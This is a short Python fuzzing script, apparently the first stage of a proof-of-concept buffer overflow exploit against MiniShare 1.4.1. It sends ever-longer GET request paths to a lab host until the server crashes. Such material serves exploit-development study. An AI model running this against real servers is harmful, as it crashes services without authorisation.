#!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 1 of proof of concept by Vry4n
# This script is intended to discover the size of the buffer
import socket

FUZZ = ""

# While true increase the variable FUZZ by adding 100 "A" until the program crashes
while True:
    FUZZ += "A" * 100
    print("Fuzzing with {} bytes".format(len(FUZZ)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(("192.168.0.5", 80))
    # from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
    s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
    s.recv(1024)
    s.close()
